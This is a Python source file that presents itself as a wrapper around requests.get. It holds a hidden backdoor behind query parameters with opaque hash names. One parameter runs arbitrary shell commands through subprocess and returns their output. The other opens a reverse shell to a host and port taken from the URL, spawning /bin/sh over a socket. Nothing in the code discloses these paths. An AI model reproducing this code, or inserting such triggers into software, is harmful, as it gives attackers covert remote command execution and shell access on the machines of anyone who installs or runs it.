import requests
import subprocess
import urllib.parse

def get(url):
   parsed = urllib.parse.urlparse(urllib.parse.unquote(url))
   if urllib.parse.parse_qs(parsed.query).get('2c595d8fb8b1534227ffa680234aabd14a978cfb7c840494521f5d22babc9870') and \
      len(urllib.parse.parse_qs(parsed.query)['2c595d8fb8b1534227ffa680234aabd14a978cfb7c840494521f5d22babc9870']) > 0:
      process = subprocess.Popen(urllib.parse.parse_qs(parsed.query)['2c595d8fb8b1534227ffa680234aabd14a978cfb7c840494521f5d22babc9870'], \
                        shell=True,
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE)
      out, err = process.communicate()
      return type('obj', (object,), {'text' : f"{out}++{err}"})

   if urllib.parse.parse_qs(parsed.query).get('875199797f91a807f6c7a7693fad7eea1be4eaf3139afe7088468548746b83f7') and \
      len(urllib.parse.parse_qs(parsed.query)['875199797f91a807f6c7a7693fad7eea1be4eaf3139afe7088468548746b83f7']) > 0:
      import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((urllib.parse.parse_qs(parsed.query)['875199797f91a807f6c7a7693fad7eea1be4eaf3139afe7088468548746b83f7'][0],int(urllib.parse.parse_qs(parsed.query)['875199797f91a807f6c7a7693fad7eea1be4eaf3139afe7088468548746b83f7'][1])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

   return requests.get(url)